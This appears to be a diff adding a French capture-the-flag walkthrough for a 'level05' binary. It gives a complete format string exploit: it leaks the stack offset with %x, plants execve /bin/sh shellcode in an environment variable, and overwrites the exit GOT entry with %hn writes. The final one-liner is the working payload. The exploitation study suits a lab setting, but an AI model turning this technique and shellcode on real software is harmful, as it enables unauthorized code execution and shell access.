@@ -1,0 +1,42 @@
+On voit que le programe attend une chaine de caracteres depuis l'entre standart et la raffiche en minuscule.
+En regardant le code sous gdb, on voit qu'il fait un fgets, et raffiche la string transformee avec un printf. Nous allons donc essayer de faire un string exploit.
+
+Avec:
+(python -c 'print "A" * 4 + "%x " * 20') | ./level05
+aaaa64 f7fcfac0 f7ec3add ffffd5ff ffffd5fe 0 ffffffff ffffd684 f7fdb000 61616161 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
+On voit que les arguments de printfs sont a l'offset 10 sur la stack.
+
+Etant donne que le code source n'ouvre pas de shell / manipule le flag du level06, nous allons injecter un shellcode dans l'environnement: 
+export shellk=$(python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+
+Sous gdb, nous allons pouvoir obtenir l'adresse de notre shellcode grace a:
+	1- b main
+	2- r
+	3- x getenv("shellk")
+
+/!\ l'adresse du shellcode depend de l'environnement. Nous n'auront donc pas de valeure absolue a fournir pour ce niveau /!\
+Pour la suite de ce walkthrought, nous allons partir du principe que l'adresse du shellcode est de 0xffffdefa.
+
+Nous allons ensuite chercher l'adresse de exit, afin la remplacer par celle du shellcode. 
+Pour se faire, nous allons disass exit sous gdb:
+(gdb) disass exit
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:			jmp    DWORD PTR ds:0x80497e0
+   0x08048376 <+6>:			push   0x18
+   0x0804837b <+11>:		jmp    0x8048330
+End of assembler dump.
+
+Nous allons recrire le contenu de l'addresse 0x80497e0. Pour se faire, on va ecrire va ecrire n octets a cette adresse grace a %n.
+Pour ecrire l'adresse de notre shellcode, on aurait n = 4294958842 (= 0xffffdefa).
+Afin de ne manipuler des nombres trop grand, nous allons utiliser l'option h de printf afin d'ecrire la taille de 2 shorts.
+Note: Nous sommes sur un system 32. Ce qui veut dire que les adresses sont codees sur 32 bits, soit la taille d'un int ou de deux shorts.
+
+Nous allons donc devoir ecrire 0xffff et 0xdefa. Comme 0xffff > 0xdefa, on va commencer par ecrire 0xdefa puis le reste. Etant donne qu'on a deja ecrit 8 bytes avec les adresses d'exit, nous allons devoir les soustraires a 0xdefa.
+>>> 0xdefa - 8
+57074
+Nous allons ensuite calculer le reste pour arriver a 0xffff
+>>> 0xffff - 0xdefa
+8453
+
+Ce qui nous donne:
+(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57074u" + "%10$hn" + "%8453u" + "%11$hn"'; cat) | ./level05
